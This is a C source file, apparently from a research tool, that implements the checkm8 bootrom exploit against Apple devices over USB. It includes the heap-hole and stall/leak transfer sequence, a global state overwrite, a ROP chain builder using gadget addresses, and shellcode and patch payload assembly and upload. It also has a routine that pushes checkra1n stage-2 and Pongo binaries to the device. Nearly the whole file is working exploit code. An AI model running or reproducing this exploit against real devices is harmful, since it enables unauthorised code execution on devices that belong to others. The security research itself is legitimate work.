#include "checkm8.h"

#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include "tool/usb_helpers.h"
#include "tool/payload.h"
#include "tool/command.h"
#include "tool/exploit_config.h"
#include "dev/addr.h"
#include "libpayload_int.h"

#define PARTIAL_TIMEOUT 0

int stall(struct pwned_device *dev)
{
    checkm8_debug_indent("stall(dev = %p)\n", dev);
    unsigned char buf[0xC0];

    memset(buf, 0xA, 0xC0);
    return partial_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC0, PARTIAL_TIMEOUT);
}

int leak(struct pwned_device *dev)
{
    checkm8_debug_indent("leak(dev = %p)\n", dev);
    unsigned char buf[0xC0];

    memset(buf, 0, 0xC0);
    return no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 1);
}

int no_leak(struct pwned_device *dev)
{
    checkm8_debug_indent("no_leak(dev = %p)\n", dev);
    unsigned char buf[0xC1];

    memset(buf, 0xA, 0xC1);
    return no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC1, 1);
}

void create_heap_hole(struct pwned_device *dev)
{
    int i, ret;
    checkm8_debug_indent("exploit stage 1\n");

    while(1)
    {
        ret = stall(dev);
        if(ret == CHECKM8_SUCCESS)
        {
            checkm8_debug_indent("\tstall was successful\n");
            ret = leak(dev);
            if(IS_CHECKM8_FAIL(ret))
            {
                checkm8_debug_indent("\tleak failed\n");
                reset(dev);
            }
            else
            {
                checkm8_debug_indent("\tleak timed out, good\n");
                break;
            }
        }
    }

    for(i = 0; i < 6; i++)
        no_leak(dev);

    reset(dev);
}

void set_global_state(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 2\n");
    unsigned char databuf[0x800];
    memset(databuf, 'A', 0x800);

    partial_ctrl_transfer(dev, 0x21, 1, 0, 0, databuf, 0x800, PARTIAL_TIMEOUT);
    no_error_ctrl_transfer(dev, 0, 0, 0, 0, databuf, EXPLOIT_OVERWRITE, 1);
    no_error_ctrl_transfer(dev, 0x21, 4, 0, 0, NULL, 0, 0);
    reset(dev);
}

static inline size_t rop_len(int num)
{
    int nblocks = num / 5;
    if(num % 5 != 0)
        nblocks++;

    return nblocks * sizeof(struct rop_block);
}

int build_rop(void *target, struct callback cb[EXPLOIT_NUM_ROP], DEV_PTR_T rop_base)
{
    int block, j;
    uint64_t current = rop_base;
    struct rop_block *curr;

    for(block = 0; block < EXPLOIT_NUM_ROP; block += 5)
    {
        curr = &((struct rop_block *) target)[block / 5];
        for(j = 0; j < 5 && block + j < EXPLOIT_NUM_ROP; j++)
        {
            if(block + j == EXPLOIT_NUM_ROP - 1) current = 0;
            else
            {
                current += 0x10;
                if(j == 4)
                    current += 0x50;
            }

            if(cb[block + j].arg == EXPLOIT_REPLACE ||
               cb[block + j].func == EXPLOIT_REPLACE)
            {
                return -CHECKM8_FAIL_INVARGS;
            }

            curr->request[j].callback = ADDR_FUNC_GADGET;
            curr->request[j].next = current;
            memcpy(&curr->params[j], &cb[block + j], sizeof(struct callback));
        }
    }

    return CHECKM8_SUCCESS;
}

static inline int position_payload(int num, int align,
                                   const int lengths[], unsigned int *offsets[])
{
    int i, j;
    struct bin local_bins[EXPLOIT_NUM_BINS];
    memcpy(local_bins, exploit_bins, sizeof(exploit_bins));

    for(i = 0; i < num; i++)
    {
        for(j = 0; j < EXPLOIT_NUM_BINS; j++)
        {
            if(local_bins[j].start % align != 0)
                local_bins[j].start += (align - (local_bins[j].start % align));

            if(local_bins[j].end == -1 ||
               lengths[i] < (local_bins[j].end - local_bins[j].start))
            {
                *offsets[i] = local_bins[j].start;
                local_bins[j].start += lengths[i];
                break;
            }
        }
    }

    return local_bins[EXPLOIT_NUM_BINS - 1].start;
}

int build_payload(void **target, DEV_PTR_T *rop_base)
{
    checkm8_debug_indent("build_payloads()\n");
    struct payload *shellcode, *patch, *handler;
    unsigned int shellcode_offs, patch_offs, rop_offs, handler_offs;
    PAYLOAD_T shellcode_name, handler_name;

#ifdef MIMIC_CHECKRA1N
    shellcode_name = PAYLOAD_CHECKRA1N_STAGE1;
    handler_name = PAYLOAD_CHECKRA1N_HANDLER;
#else
    shellcode_name = PAYLOAD_CHECKM8;
    handler_name = PAYLOAD_HANDLER;
#endif

    int ret;

    struct callback local_rop[EXPLOIT_NUM_ROP];
    memcpy(local_rop, exploit_rop, sizeof(exploit_rop));

    int payload_len;
    uint8_t *payload;

    if(target == NULL)
    {
        checkm8_debug_indent("\ttarget pointer is null\n");
        goto fail;
    }

    if(rop_base == NULL)
    {
        checkm8_debug_indent("\trop_base pointer is null\n");
        goto fail;
    }

    patch = get_payload(PAYLOAD_PATCH_TABLES);
    if(patch == NULL)
    {
        checkm8_debug_indent("\tpatch payload is null\n");
        goto fail;
    }

    shellcode = get_payload(shellcode_name);
    if(shellcode == NULL)
    {
        checkm8_debug_indent("\tshellcode payload is null\n");
        goto fail_get_shellcode;
    }

    handler = get_payload(handler_name);
    if(handler == NULL)
    {
        checkm8_debug_indent("\thandler payload is null\n");
        goto fail_get_handler;
    }

    int lengths[] = {shellcode->len, handler->len, patch->len, rop_len(EXPLOIT_NUM_ROP)};
    unsigned int *offsets[] = {&shellcode_offs, &handler_offs, &patch_offs, &rop_offs};

    payload_len = position_payload(4, 0x20, lengths, offsets);
    if(payload_len < sizeof(exploit_table))
    {
        checkm8_debug_indent("\tpayload placement was corrupted\n");
        goto fail_place_payload;
    }

    payload = calloc(payload_len, 1);
    if(payload == NULL)
    {
        checkm8_debug_indent("\tpayload allocation failed\n");
        goto fail_place_payload;
    }

    memcpy(payload, exploit_table, sizeof(exploit_table));
    memcpy(&payload[patch_offs], patch->data, patch->len);
    memcpy(&payload[shellcode_offs], shellcode->data, shellcode->len);
    memcpy(&payload[handler_offs], handler->data, handler->len);

    local_rop[INDEX_CIVAC].arg = ADDR_DFU_IMG_BASE + patch_offs;
    local_rop[INDEX_PATCH].func = EXECUTABLE_SRAM(ADDR_DFU_IMG_BASE + patch_offs);
    local_rop[INDEX_SHELLCODE].func = EXECUTABLE_SRAM(ADDR_DFU_IMG_BASE + shellcode_offs);
    local_rop[INDEX_SHELLCODE].arg = (((uint64_t) handler->len) << 32u) | handler_offs;

    ret = build_rop(&payload[rop_offs], local_rop, ADDR_DFU_IMG_BASE + rop_offs - 0x20);
    if(IS_CHECKM8_FAIL(ret))
    {
        checkm8_debug_indent("\tfailed to build ROP chain\n");
        goto fail_place_payload;
    }

    free(patch);
    free(shellcode);
    free(handler);

    *target = payload;
    *rop_base = ADDR_DFU_IMG_BASE + rop_offs - 0x20;
    return payload_len;

fail_place_payload:
    free(handler);

fail_get_handler:
    free(shellcode);

fail_get_shellcode:
    free(patch);

fail:
    return -1;
}

int build_overwrite(void **target, DEV_PTR_T rop_base)
{
    checkm8_debug_indent("build_overwite\n");
    if(target == NULL)
    {
        checkm8_debug_indent("\ttarget pointer is null\n");
        return -1;
    }

    *target = calloc(80 + 4 * sizeof(uint64_t), 1);
    if(*target == NULL)
    {
        checkm8_debug_indent("\toverwrite allocation failed\n");
        return -1;
    }

    ((uint64_t *) *target)[4] = ADDR_NOP_GADGET;
    ((uint64_t *) *target)[5] = rop_base;
    ((uint64_t *) *target)[12] = ADDR_NOP_GADGET;
    ((uint64_t *) *target)[13] = rop_base;
    return 80 + 4 * sizeof(uint64_t);
}

void transfer_checkm8(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 3\n");

    int ret;
    long index, amount;
    long ow_len, pl_len;

    uint8_t *overwrite_buf, *payload_buf;
    DEV_PTR_T rop_base;

    pl_len = build_payload((void **) &payload_buf, &rop_base);
    ow_len = build_overwrite((void **) &overwrite_buf, rop_base);

    while(1)
    {
        ret = stall(dev);
        if(ret == CHECKM8_SUCCESS)
        {
            checkm8_debug_indent("\tstall was successful\n");
            ret = leak(dev);
            if(IS_CHECKM8_FAIL(ret))
            {
                checkm8_debug_indent("\tleak failed\n");
                reset(dev);
            }
            else
            {
                checkm8_debug_indent("\tleak timed out, good\n");
                break;
            }
        }
    }

    leak(dev);

    checkm8_debug_indent("\ttransferring overwrite (%i bytes)\n", ow_len);
    index = 0;
    while(index < ow_len)
    {
        if(ow_len - index >= MAX_PACKET_SIZE) amount = MAX_PACKET_SIZE;
        else amount = ow_len - index;
        checkm8_debug_indent("\tbytes %i to %i\n", index, index + amount);

        no_error_ctrl_transfer_data(dev, 0, 0, 0, 0, &overwrite_buf[index], amount, 100);
        index += amount;
    }

    checkm8_debug_indent("\ttransferring payload (%i bytes)\n", pl_len);
    index = 0;
    while(index < pl_len)
    {
        if(pl_len - index >= MAX_PACKET_SIZE) amount = MAX_PACKET_SIZE;
        else amount = pl_len - index;
        checkm8_debug_indent("\tbytes %i to %i\n", index, index + amount);

        no_error_ctrl_transfer_data(dev, 0x21, 1, 0, 0, &payload_buf[index], amount, 100);
        index += amount;
    }

    reset(dev);
}

int check_function(struct pwned_device *dev)
{
    checkm8_debug_indent("checking device serial\n");
    unsigned char serial_buf[128];
    int ret;

    ret = serial_descriptor(dev, serial_buf, sizeof(serial_buf));
    if(IS_CHECKM8_FAIL(ret))
        return ret;

    checkm8_debug_indent("\tgot serial %s\n", serial_buf);
    if(strstr((char *) serial_buf, "PWND:[checkm8]") == NULL)
        return -CHECKM8_FAIL_NOEXP;

    return CHECKM8_SUCCESS;
}

struct pwned_device *exploit_device(bool sync)
{
    checkm8_debug_indent("exploit_device()\n");
    int ret;

    struct pwned_device *res = calloc(1, sizeof(struct pwned_device));
    if(res == NULL)
    {
        checkm8_debug_indent("\tfailed to allocate pwned_device\n");
        goto fail_alloc_dev;
    }

    checkm8_debug_indent("exploit_device() -> dev = %p\n", res);
    res->status = DEV_NORMAL;

#ifdef WITH_ARDUINO
    res->ard_fd = -1;
#else
    res->bundle = calloc(1, sizeof(struct libusb_device_bundle));
    if(res->bundle == NULL)
    {
        checkm8_debug_indent("\tfailed to allocate device bundle\n");
        goto fail;
    }
#endif

    ret = open_device_session(res, DEV_IDVENDOR, DEV_IDPRODUCT);
    if(IS_CHECKM8_FAIL(ret))
    {
        checkm8_debug_indent("\tfailed to open device session\n");
        goto fail;
    }

    ret = check_function(res);
    if(ret == CHECKM8_SUCCESS)
    {
        checkm8_debug_indent("\tdevice is already exploited\n");
        res->status = DEV_PWNED;

        if(sync)
        {
            ret = sync_payloads(res);
            if(IS_CHECKM8_FAIL(ret))
            {
                checkm8_debug_indent("\tfailed to synchronize payloads\n");
                goto close;
            }
        }

        close_device_session(res);
        return res;
    }
    else if(ret == -CHECKM8_FAIL_NODEV)
    {
        checkm8_debug_indent("\tno device found\n");
        goto close;
    }
    else
    {
        // first create a hole in the heap
        create_heap_hole(res);
        usleep(500000);

        // then set the global state
        set_global_state(res);
        usleep(500000);

        // finally, transfer the payload
        transfer_checkm8(res);
        usleep(500000);

        // wait for DFU to reinitialize
        close_device_session(res);
        usleep(500000);
        ret = open_device_session(res, DEV_IDVENDOR, DEV_IDPRODUCT);
        if(IS_CHECKM8_FAIL(ret))
        {
            checkm8_debug_indent("\tno pwned device found after exploit\n");
            goto close;
        }

        ret = check_function(res);
        if(ret == CHECKM8_SUCCESS)
        {
            // exploit succeeded, we have a clean checkm8 device
            // no need to synchronize gadgets
            checkm8_debug_indent("\tsuccessfully exploited device!\n");
            res->status = DEV_PWNED;
            close_device_session(res);
            return res;
        }
        else
        {
            checkm8_debug_indent("\tfailed to exploit device\n");
            goto close;
        }
    }

close:
    close_device_session(res);

fail:
    free_device(res);

fail_alloc_dev:
    return NULL;
}

#include <stdio.h>
//#define STAGE2_FNAME "/home/grg/iPhone-AES-Research/documents/checkra1n_rev/payload_0.12.1-all.bin"

#define STAGE2_FNAME "/home/pi/linux/images/payload_0.12.1-all.bin"
#define PONGO_NAME "/home/pi/linux/images/Pongo.bin"

int checkra1n_device(struct pwned_device *dev)
{
    int ret;
    long size;
    struct payload *pongo;

    ret = open_device_session(dev, DEV_IDVENDOR, DEV_IDPRODUCT);
    if(IS_CHECKM8_FAIL(ret))
    {
        checkm8_debug_indent("\tfailed to open device session\n");
        return ret;
    }

    FILE *file = fopen(STAGE2_FNAME, "rb");
    fseek(file, 0L, SEEK_END);
    size = ftell(file);
    fseek(file, 0L, SEEK_SET);

    uint8_t stage2_data[size];
    fread(stage2_data, 1, size, file);
    fclose(file);

    int index = 0, amount;
    while(index < size)
    {
        if(size - index >= MAX_PACKET_SIZE) amount = MAX_PACKET_SIZE;
        else amount = size - index;
        checkm8_debug_indent("\tbytes %i to %i\n", index, index + amount);

        ctrl_transfer(dev, 0x21, 1, 0, 0, &stage2_data[index], amount, 100, 0);
        index += amount;
    }

    exit_dfu_mode(dev);
    close_device_session(dev);

    usleep(1e+7);

    ret = open_device_session(dev, DEV_IDVENDOR, 0x1338);
    if(IS_CHECKM8_FAIL(ret))
    {
        checkm8_debug_indent("\tfailed to open device session\n");
        return ret;
    }

#ifdef PONGO_NAME
    file = fopen(PONGO_NAME, "rb");
    fseek(file, 0L, SEEK_END);
    size = ftell(file);
    fseek(file, 0L, SEEK_SET);

    uint8_t pongo_data[size];
    fread(pongo_data, 1, size, file);
    fclose(file);

    index = 0;
    while(index < size)
    {
        if(size - index >= MAX_PACKET_SIZE) amount = MAX_PACKET_SIZE;
        else amount = size - index;
        checkm8_debug_indent("\tbytes %i to %i\n", index, index + amount);

        ctrl_transfer(dev, 0x21, 1, 0, 0, &pongo_data[index], amount, 100, 0);
        index += amount;
    }

#else
    pongo = get_payload(PAYLOAD_PONGO);
    index = 0;
    while(index < pongo->len)
    {
        if(pongo->len - index >= MAX_PACKET_SIZE) amount = MAX_PACKET_SIZE;
        else amount = pongo->len - index;
        checkm8_debug_indent("\tbytes %i to %i\n", index, index + amount);

        ctrl_transfer(dev, 0x21, 1, 0, 0, &pongo->data[index], amount, 100, 0);
        index += amount;
    }

    free(pongo);
#endif

    exit_dfu_mode(dev);
    close_device_session(dev);

    return 0;
}

void free_device(struct pwned_device *dev)
{
    checkm8_debug_indent("free_device(dev = %p)\n", dev);
    if(is_device_session_open(dev)) close_device_session(dev);
#ifndef WITH_ARDUINO
    if(dev->bundle != NULL)
        free(dev->bundle);
#endif
    free(dev);
}